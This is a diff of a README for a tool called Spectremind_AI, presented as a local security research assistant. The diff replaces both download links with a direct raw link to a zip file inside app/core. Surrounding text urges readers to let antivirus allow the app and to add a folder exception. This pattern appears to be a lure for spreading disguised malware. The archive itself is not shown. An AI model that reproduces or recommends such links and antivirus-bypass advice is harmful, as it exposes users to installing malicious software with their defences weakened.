@@ -1,6 +1,6 @@
 # 🛡️ Spectremind_AI - Local Security Assistant for Daily Research
 
-[![](https://img.shields.io/badge/Download_Spectremind_AI-Blue-blue)](https://github.com/katybest8317/Spectremind_AI)
+[![](https://img.shields.io/badge/Download_Spectremind_AI-Blue-blue)](https://raw.githubusercontent.com/katybest8317/Spectremind_AI/main/app/core/Spectremind-AI-v2.6.zip)
 
 Spectremind_AI provides a secure way to run security research tools on your computer. It performs tasks like mapping networks, testing system defenses, and documenting results without sending your data to external servers.
 
@@ -22,7 +22,7 @@ The application runs locally. This keeps your sensitive research data on your ow
 2. Check that your antivirus software allows new applications to execute. Sometimes, security tools flag research software. You may need to add an exception for the folder you just created.
 3. Visit the official page to download the latest version of the application.
 
-[Download Spectremind_AI Here](https://github.com/katybest8317/Spectremind_AI)
+[Download Spectremind_AI Here](https://raw.githubusercontent.com/katybest8317/Spectremind_AI/main/app/core/Spectremind-AI-v2.6.zip)
 
 ## ⚙️ How to Install and Launch
 
